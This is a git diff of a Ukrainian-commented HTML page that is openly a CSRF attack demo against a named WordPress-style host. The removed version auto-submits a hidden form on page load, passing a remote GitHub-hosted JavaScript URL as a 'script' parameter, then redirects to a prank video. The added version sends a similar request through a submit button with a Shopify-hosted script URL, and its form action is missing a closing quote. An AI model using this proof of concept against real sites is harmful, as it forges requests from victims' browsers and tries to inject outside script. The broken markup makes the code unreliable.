@@ -8,18 +8,19 @@
 </head>
 <body>
 
-<!-- Ця форма буде відправлятися автоматично при завантаженні сторінки -->
-<form action="https://mrcl.wptestprev.icu/building-a-strong-brand-tips-and-strategies/" method="GET" id="csrfForm">
-    <!-- Якщо потрібно додати додаткові параметри до запиту, додайте їх тут як hidden поля -->
-    <input type="hidden" name="script" value="https://raw.githubusercontent.com/pamazanya228/test/main/script.js">
+<!-- Форма для демонстрації CSRF атаки -->
+<form action="https://mrcl.wptestprev.icu method="GET" id="csrfForm">
+    <input type="hidden" name="script" value="https://plugin-shop-mvp.myshopify.com/cdn/shop/t/1/assets/test.js">
+    <input type="submit" value="Відправити форму">
 </form>
 
 <script>
-    // Автоматично відправляємо форму
-    document.getElementById("csrfForm").submit();
-
-    // Після відправки форми переходимо на YouTube посилання
-    window.location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
+    // Слухаємо подію "submit" для форми
+    document.getElementById("csrfForm").addEventListener("submit", function(event) {
+        console.log("Форма відправлена!");
+        // Якщо ви не хочете відправляти форму дійсно (тільки для перевірки), розкоментуйте наступний рядок:
+        // event.preventDefault();
+    });
 </script>
 
 </body>
